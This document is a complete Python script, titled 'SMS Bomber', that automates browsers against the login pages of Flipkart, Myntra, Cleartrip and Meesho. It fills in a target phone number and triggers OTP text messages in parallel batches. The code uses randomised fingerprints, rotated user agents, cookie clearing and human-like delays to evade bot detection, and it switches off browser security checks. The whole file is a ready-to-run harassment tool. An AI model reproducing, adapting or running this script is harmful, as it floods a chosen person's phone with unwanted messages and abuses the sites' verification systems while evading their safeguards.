import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import random
import threading
import concurrent.futures
import os
import sys
import platform
import gc  

PHONE_NUMBER = "1234567890"  # <-- Put the target phone number here
BATCH_SIZE = 40              
NUMBER_OF_BATCHES = 3        
MAX_CONCURRENT_BROWSERS = 8 
BATCH_COOLDOWN = (90, 120)   

SUPPORTED_SITES = [
    {
        "name": "Flipkart",
        "url": "https://www.flipkart.com/account/login?ret=/",
        "phone_field_selectors": [
            '.r4vIwl.BV\\+Dqf',
            'input[type="text"]',
            '.login-form input',
            'form input'
        ],
        "button_selectors": [
            ('css', '.QqFHMw.twnTnD._7Pd1Fp'),
            ('css', 'button[type="submit"]'),
            ('xpath', '//button[contains(text(), "Request OTP")]'),
            ('xpath', '//span[contains(text(), "Request OTP")]/parent::button'),
            ('css', 'button'),
            ('xpath', '//button')
        ],
        "has_checkbox": False,
        "success_indicators": [
            "otp sent",
            "sent to your mobile",
            "enter the otp",
            "verify otp"
        ]
    },
    {
        "name": "Myntra",
        "url": "https://www.myntra.com/login",
        "phone_field_selectors": [
            'input[type="tel"].form-control.mobileNumberInput',
            'input[type="tel"]',
            '.mobileNumberInput',
            'input.form-control'
        ],
        "checkbox_selectors": [
            'input[type="checkbox"].consentCheckbox',
            '.consentCheckbox',
            'input[type="checkbox"]'
        ],
        "button_selectors": [
            ('css', '.disabledSubmitBottomOption'),
            ('xpath', '//div[contains(text(), "CONTINUE")]'),
            ('xpath', '//div[contains(@class, "submitBottomOption")]'),
            ('xpath', '//button[contains(text(), "CONTINUE")]')
        ],
        "has_checkbox": True,
        "success_indicators": [
            "sent to",
            "resend",
            "enter otp",
            "verify mobile"
        ]
    },
    {
        "name": "Cleartrip",
        "url": "https://www.cleartrip.com/", 
        "phone_field_selectors": [
            'input#mobile',
            'input[placeholder*="mobile"]',
            'input[type="number"]',
            'input[type="tel"]',
            '.mobile-input__correct input'
        ],
        "button_selectors": [
            ('css', 'button.sc-dhKdcB'),
            ('xpath', '//button[contains(., "Get OTP")]'),
            ('xpath', '//span[contains(text(), "Get OTP")]/ancestor::button'),
            ('xpath', '//h4[contains(text(), "Get OTP")]/ancestor::button'),
            ('xpath', '//button[contains(@class, "bg-black-500")]'),
            ('xpath', '//button[contains(., "OTP")]')
        ],
        "has_checkbox": False,
        "success_indicators": [
            "otp sent",
            "sent to your mobile",
            "verification code",
            "verify mobile"
        ]
    },
    {
        "name": "Meesho",
        "url": "https://www.meesho.com/auth?redirect=https%3A%2F%2Fwww.meesho.com%2F&source=profile&entry=header&screen=HP",
        "phone_field_selectors": [
            'input.Input__InputField-sc-1goybxj-1',
            'input[type="tel"][maxlength="10"]',
            '.Input__InputContainer-sc-1goybxj-0 input',
            'input[type="tel"]'
        ],
        "button_selectors": [
            ('xpath', '//button[@type="submit"]'),
            ('css', 'button.jPEBET'),
            ('css', 'button.sc-fEXmlR'),
            ('xpath', '//span[text()="Continue"]/ancestor::button'),
            ('xpath', '//div[contains(@class, "sc-bjfHbI")]/parent::button')
        ],
        "has_checkbox": False,
        "success_indicators": [
            "resend",
            "enter otp",
            "verify mobile",
            "otp sent"
        ]
    }
]

SITE_SEQUENCE = ["Flipkart", "Myntra", "Cleartrip", "Meesho"]

def manage_memory():
    """Force garbage collection to free up memory during long runs"""
    gc.collect()
    if platform.system().lower() == "linux":
        try:
            os.system("sync")  
        except:
            pass

def random_delay(min_seconds=0.5, max_seconds=1.5):
    """Add a random delay to appear more human-like"""
    time.sleep(random.uniform(min_seconds, max_seconds))

def generate_fingerprint_options():
    """Generate random browser fingerprint to avoid detection"""
    options = uc.ChromeOptions()
    
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-notifications')
    options.add_argument('--disable-extensions')
    options.add_argument('--disable-popup-blocking')
    
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-accelerated-2d-canvas')
    options.add_argument('--no-first-run')
    options.add_argument('--no-zygote')
    options.add_argument('--disable-web-security')
    options.add_argument('--disable-features=IsolateOrigins,site-per-process')
    options.add_argument('--disable-setuid-sandbox')
    options.add_argument('--disable-infobars')
    options.add_argument('--ignore-certificate-errors')
    options.add_argument('--disable-logging')
    options.add_argument('--log-level=3')
    options.add_argument('--silent')
    
    options.add_argument('--js-flags=--expose-gc')
    options.add_argument('--disable-hang-monitor')
    options.add_argument('--disable-sync')
    options.add_argument('--disable-translate')
    options.add_argument('--disable-default-apps')
    options.add_argument('--blink-settings=imagesEnabled=false')  
    

    system = platform.system().lower()
    if system == 'linux':
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
    
    # Headless mode for better performance (uncomment if needed)
    # options.add_argument('--headless')
    
    resolutions = [
        '800,600', '1024,768', '1280,720'
    ]
    options.add_argument(f'--window-size={random.choice(resolutions)}')
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
    options.add_argument(f'--user-agent={random.choice(user_agents)}')
    
    languages = ['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-CA,en;q=0.9', 'en-IN,en;q=0.9']
    options.add_argument(f'--lang={random.choice(languages)}')
    
    return options

def send_sms_in_browser(thread_id, attempts_per_thread, batch_num):
    """Function to run in each thread"""
    print(f"[*] Batch {batch_num} - Thread {thread_id} starting...")
    
    startup_delay = random.uniform(0.5, 2)
    time.sleep(startup_delay)
    
    options = generate_fingerprint_options()
    
    successful = 0
    attempts_made = 0
    
    site_index = thread_id % len(SITE_SEQUENCE)
    site_name = SITE_SEQUENCE[site_index]
    
    site = next((s for s in SUPPORTED_SITES if s["name"] == site_name), SUPPORTED_SITES[0])
    
    print(f"[*] Thread {thread_id} assigned to site: {site['name']}")
    
    try:
        system = platform.system().lower()
        if system == 'windows':
            browser = uc.Chrome(options=options, use_subprocess=True)
        elif system == 'darwin':  
            browser = uc.Chrome(options=options)
        else:  
            browser = uc.Chrome(options=options, use_subprocess=True)
            
        wait = WebDriverWait(browser, 10)  
        
        for i in range(attempts_per_thread):
            try:
                print(f"[*] Batch {batch_num} - Thread {thread_id} - Attempt {i+1}/{attempts_per_thread} on {site['name']}")
                attempts_made += 1
                
                browser.set_page_load_timeout(20) 
                
                try:
                    browser.get(site['url'])
                except TimeoutException:
                    print(f"[!] Page load timeout for {site['name']}, refreshing...")
                    browser.execute_script("window.stop();")
                    continue
                
                random_delay(2, 4)  
                
                print(f"[*] Looking for phone input field on {site['name']}...")
                
                number_field = None
                for selector in site['phone_field_selectors']:
                    try:
                        number_field = wait.until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                        )
                        if number_field.is_displayed():
                            print(f"[*] Found input field with selector: {selector}")
                            break
                    except:
                        continue
                
                if not number_field:
                    print(f"[-] Could not find phone input field on {site['name']}")
                    continue
                
                try:
                    number_field.clear()
                    
                    number_field.send_keys(PHONE_NUMBER)
                    
                    input_value = browser.execute_script("return arguments[0].value;", number_field)
                    if input_value != PHONE_NUMBER:
                        browser.execute_script(f"arguments[0].value = '{PHONE_NUMBER}';", number_field)
                        
                        if browser.execute_script("return arguments[0].value;", number_field) != PHONE_NUMBER:
                            number_field.clear()
                            for digit in PHONE_NUMBER:
                                number_field.send_keys(digit)
                                time.sleep(0.1)
                    
                    final_value = browser.execute_script("return arguments[0].value;", number_field)
                    print(f"[*] Phone number input: {final_value}")
                    
                    browser.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", number_field)
                    browser.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", number_field)
                    
                except Exception as e:
                    print(f"[-] Error inputting phone number: {str(e)}")
                    continue
                
                random_delay(1, 2)
                
                if site['has_checkbox']:
                    print(f"[*] Looking for checkbox on {site['name']}...")
                    checkbox_clicked = False
                    
                    for checkbox_selector in site['checkbox_selectors']:
                        try:
                            checkbox = wait.until(
                                EC.presence_of_element_located((By.CSS_SELECTOR, checkbox_selector))
                            )
                            if checkbox.is_displayed():
                                try:
                                    checkbox.click()
                                except:
                                    browser.execute_script("arguments[0].click();", checkbox)
                                
                                print(f"[*] Clicked checkbox with selector: {checkbox_selector}")
                                checkbox_clicked = True
                                break
                        except:
                            continue
                    
                    if not checkbox_clicked and site['has_checkbox']:
                        print(f"[-] Could not find or click checkbox on {site['name']}")
                        continue
                
                random_delay(1, 2)
                
                print(f"[*] Looking for OTP/Continue button on {site['name']}")
                
                button_found = False
                
                if site['name'] == "Meesho":
                    try:
                        submit_buttons = browser.find_elements(By.XPATH, "//button[@type='submit']")
                        for btn in submit_buttons:
                            if btn.is_displayed():
                                try:
                                    browser.execute_script("arguments[0].click();", btn)
                                    print(f"[*] Clicked Meesho submit button")
                                    button_found = True
                                    break
                                except:
                                    continue
                    except:
                        pass
                
                if not button_found:
                    for selector_type, selector in site['button_selectors']:
                        try:
                            if selector_type == 'css':
                                otp_button = wait.until(
                                    EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                                )
                            else:
                                otp_button = wait.until(
                                    EC.presence_of_element_located((By.XPATH, selector))
                                )
                                
                            if otp_button.is_displayed():
                                print(f"[*] Found button with selector: {selector}")
                                
                                try:
                                    otp_button.click()
                                except:
                                    browser.execute_script("arguments[0].click();", otp_button)
                                    
                                button_found = True
                                break
                        except Exception as e:
                            print(f"[-] Error with button selector {selector}: {str(e)}")
                            continue
                
                if button_found:
                    random_delay(3, 5)  
                    
                    otp_verified = verify_otp_sent(browser, site)
                    
                    if otp_verified:
                        successful += 1
                        print(f"[+] Batch {batch_num} - Thread {thread_id} - SMS sent successfully via {site['name']}! ({successful} total)")
                    else:
                        if site['name'] == "Meesho":
                            try:
                                current_url = browser.current_url
                                if "otp" in current_url.lower() or "verify" in current_url.lower():
                                    successful += 1
                                    print(f"[+] Batch {batch_num} - Thread {thread_id} - Meesho redirected to OTP page! ({successful} total)")
                                    continue
                            except:
                                pass
                        
                        print(f"[?] Batch {batch_num} - Thread {thread_id} - Button clicked but couldn't verify OTP on {site['name']}")
                else:
                    print(f"[-] Could not find or click OTP button on {site['name']}")
                
                cooldown = random.uniform(3, 5)
                time.sleep(cooldown)
                
                if i % 3 == 0 and i > 0:
                    try:
                        browser.execute_script("window.localStorage.clear();")
                        browser.execute_script("window.sessionStorage.clear();")
                        browser.delete_all_cookies()
                    except:
                        pass
                
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                time.sleep(2)
            
    except Exception as e:
        print(f"[-] Fatal error: {str(e)}")
    finally:
        try:
            browser.quit()
        except:
            pass
        
        print(f"[*] Thread {thread_id} completed: {successful} successful out of {attempts_made} attempts on {site['name']}")
        return successful

def verify_otp_sent(browser, site):
    """Verify if OTP was actually sent by looking for confirmation messages"""
    try:
        success_messages = site.get('success_indicators', [
            "OTP sent",
            "sent to your mobile",
            "sent to your phone",
            "verification code",
            "verification sent",
            "code sent",
            "sent successfully",
            "sent to",
            "resend",
            "enter otp",
            "enter the otp",
            "verify otp"
        ])
        
        page_source = browser.page_source.lower()
        
        for message in success_messages:
            if message.lower() in page_source:
                print(f"[+] OTP confirmation found: '{message}' on {site['name']}")
                return True
        
        otp_input_selectors = [
            'input[placeholder*="otp"]',
            'input[placeholder*="code"]',
            'input[placeholder*="verification"]',
            'input[aria-label*="otp"]',
            'input[name*="otp"]',
            'input.otp-input',
            '.otp-input',
            'input[type="tel"][maxlength="6"]',
            'input[type="number"][maxlength="6"]'
        ]
        
        for selector in otp_input_selectors:
            try:
                otp_field = browser.find_element(By.CSS_SELECTOR, selector)
                if otp_field.is_displayed():
                    print(f"[+] OTP input field found on {site['name']}")
                    return True
            except:
                continue
        
        # Take a screenshot to debug (uncomment if needed)
        # try:
        #     screenshot_path = f"debug_{site['name']}_{time.time()}.png"
        #     browser.save_screenshot(screenshot_path)
        #     print(f"[*] Saved debug screenshot to {screenshot_path}")
        # except:
        #     pass
                
        return False
    except Exception as e:
        print(f"[-] Error in verify_otp_sent: {str(e)}")
        return False

def clear_screen():
    """Clear terminal screen in a cross-platform way"""
    if platform.system().lower() == "windows":
        os.system('cls')
    else:
        os.system('clear')

def run_batch(batch_num):
    """Run a batch of SMS sending"""
    print(f"\n[*] Starting Batch {batch_num}/{NUMBER_OF_BATCHES}")
    print(f"[*] Target Number: {PHONE_NUMBER}")
    print(f"[*] Messages in this batch: {BATCH_SIZE}")
    print(f"[*] Parallel Browsers: {MAX_CONCURRENT_BROWSERS}")
    print(f"[*] Operating System: {platform.system()} {platform.release()}")
    
    print("\n[*] Browser-Site Assignments:")
    for i in range(MAX_CONCURRENT_BROWSERS):
        site_index = i % len(SITE_SEQUENCE)
        site_name = SITE_SEQUENCE[site_index]
        print(f"   Browser {i+1}: {site_name}")
    
    start_time = time.time()
    
    attempts_per_thread = BATCH_SIZE // MAX_CONCURRENT_BROWSERS
    if attempts_per_thread < 1:
        attempts_per_thread = 1
        num_threads = BATCH_SIZE
    else:
        num_threads = MAX_CONCURRENT_BROWSERS
        
    remaining_attempts = BATCH_SIZE - (attempts_per_thread * num_threads)
    
    print(f"[*] Each browser will handle {attempts_per_thread} attempts (plus {remaining_attempts} distributed)")
    
    manage_memory()
    
    futures_list = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        for i in range(num_threads):
            thread_attempts = attempts_per_thread
            if i < remaining_attempts:
                thread_attempts += 1
                
            futures_list.append(executor.submit(send_sms_in_browser, i, thread_attempts, batch_num))
        
        successful_total = 0
        completed = 0
        
        for future in concurrent.futures.as_completed(futures_list):
            successful_total += future.result()
            completed += 1
            
            print(f"[*] Progress: {completed}/{num_threads} browsers completed, {successful_total} successful SMS sent so far")
            
            if completed % 4 == 0:
                manage_memory()
    
    manage_memory()
    
    end_time = time.time()
    duration = end_time - start_time
    
    success_rate = (successful_total / BATCH_SIZE) * 100 if BATCH_SIZE > 0 else 0
    
    print(f"\n=== Batch {batch_num} Summary ===")
    print(f"Attempts: {BATCH_SIZE}")
    print(f"Successful: {successful_total}")
    print(f"Failed: {BATCH_SIZE - successful_total}")
    print(f"Success Rate: {success_rate:.2f}%")
    print(f"Time taken: {duration:.2f} seconds")
    print(f"Rate: {successful_total / duration:.2f} SMS/second")
    
    return successful_total

def send_sms_bombs():
    clear_screen()
    print(f"\n{'='*60}")
    print(f"SMS Bomber - Cross-Platform Edition")
    print(f"Operating System: {platform.system()} {platform.release()} ({platform.machine()})")
    print(f"Python Version: {platform.python_version()}")
    print(f"{'='*60}")
    
    print(f"\n[*] Starting SMS Bomber - BATCH MODE")
    print(f"[*] Target Number: {PHONE_NUMBER}")
    print(f"[*] Total batches: {NUMBER_OF_BATCHES}")
    print(f"[*] Batch size: {BATCH_SIZE}")
    print(f"[*] Total messages to send: {BATCH_SIZE * NUMBER_OF_BATCHES}")
    print(f"[*] Supported Sites ({len(SUPPORTED_SITES)}): {', '.join([site['name'] for site in SUPPORTED_SITES])}")
    
    print("\n[*] Browser-Site Assignments:")
    for i in range(MAX_CONCURRENT_BROWSERS):
        site_index = i % len(SITE_SEQUENCE)
        site_name = SITE_SEQUENCE[site_index]
        print(f"   Browser {i+1}: {site_name}")
    
    overall_start_time = time.time()
    total_successful = 0
    
    try:
        for batch in range(1, NUMBER_OF_BATCHES + 1):
            successful_batch = run_batch(batch)
            total_successful += successful_batch
            
            manage_memory()
            
            if batch < NUMBER_OF_BATCHES:
                cooldown_time = random.randint(BATCH_COOLDOWN[0], BATCH_COOLDOWN[1])
                print(f"\n[*] Cooldown period between batches: {cooldown_time} seconds")
                
                for remaining in range(cooldown_time, 0, -1):
                    progress = int(50 * (1 - remaining / cooldown_time))
                    bar = "[" + "#" * progress + "-" * (50 - progress) + "]"
                    sys.stdout.write(f"\r[*] Next batch starts in {remaining} seconds... {bar}")
                    sys.stdout.flush()
                    time.sleep(1)
                    
                    if remaining % 30 == 0:
                        manage_memory()
                
                print("\n")
    
    except KeyboardInterrupt:
        print("\n\n[!] Process interrupted by user. Shutting down...")
    
    overall_end_time = time.time()
    overall_duration = overall_end_time - overall_start_time
    
    total_attempts = BATCH_SIZE * NUMBER_OF_BATCHES
    overall_success_rate = (total_successful / total_attempts) * 100 if total_attempts > 0 else 0
    
    print(f"\n{'='*60}")
    print(f"SMS Bomber - Final Summary")
    print(f"{'='*60}")
    print(f"Target Number: {PHONE_NUMBER}")
    print(f"Total Attempts: {total_attempts}")
    print(f"Total Successful: {total_successful}")
    print(f"Total Failed: {total_attempts - total_successful}")
    print(f"Success Rate: {overall_success_rate:.2f}%")
    print(f"Total Time: {overall_duration:.2f} seconds")
    if overall_duration > 0:
        print(f"Overall Rate: {total_successful / overall_duration:.2f} SMS/second")
    print(f"{'='*60}")

if __name__ == "__main__":
    if len(PHONE_NUMBER) < 10:
        print("[-] Error: Please enter a valid phone number in the PHONE_NUMBER variable")
    else:
        try:
            send_sms_bombs()
        except KeyboardInterrupt:
            print("\n[!] Process interrupted by user")
            sys.exit(0) 